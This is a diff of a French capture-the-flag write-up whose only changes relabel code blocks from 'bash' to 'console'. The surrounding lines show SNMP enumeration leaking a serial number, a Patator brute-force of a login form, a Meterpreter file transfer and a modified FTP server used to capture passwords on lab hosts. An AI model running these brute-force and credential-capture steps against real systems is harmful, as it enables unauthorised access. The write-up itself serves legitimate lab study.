@@ -74,7 +74,7 @@ PORT    STATE SERVICE
 
 Quand on le questionne on obtient exactement ce que l'on désire :  
 
-```bash
+```console
 $ snmpwalk -c public -v 1 10.10.10.105
 iso.3.6.1.2.1.47.1.1.1.1.11 = STRING: "SN#NET_45JDX23"
 End of MIB
@@ -84,7 +84,7 @@ Reste à voir sous quelle forme utiliser ça...
 
 J'ai rassemblé dans un fichier texte différentes permutations de ce code (en omettant ou pas le dièse, avec ou sans le NET\_, etc) et j'ai passé le tout à *Patator* :  
 
-```bash
+```console
 $ patator http_fuzz url="http://10.10.10.105/" method=POST body="username=FILE0&password=FILE1" 0=words.txt 1=words.txt -x ignore:clen=1538
 10:10:28 patator    INFO - Starting Patator v0.7 (https://github.com/lanjelot/patator) at 2019-01-27 10:10 CET
 10:10:28 patator    INFO -
@@ -228,7 +228,7 @@ MAC Address: 00:16:3E:C4:FA:83 (Unknown)
 
 On suppose que les versions de *Quagga* (le logiciel correspondant au service bgp) sont les mêmes pour toutes les machines du CTF :  
 
-```bash
+```console
 $ dpkg -l | grep -i quag
 ii  quagga                           0.99.24.1-2ubuntu1.4                       amd64        BGP/OSPF/RIP routing daemon
 ```
@@ -314,7 +314,7 @@ systemctl restart quagga
 
 Python ne dispose pas par défaut d'un module de serveur FTP du coup je me suis retranché sur *pyftpdlib*. Je l'ai préalablement modifié, car même en mode DEBUG le mot de passe est caché via des astérisques puis je l'ai transféré via Meterpreter.  
 
-```bash
+```console
 $ python3 -m pyftpdlib -p 21 -D
 [I 2019-02-03 16:12:31] >>> starting FTP server on 0.0.0.0:21, pid=1271 <<<
 [I 2019-02-03 16:12:31] concurrency model: async
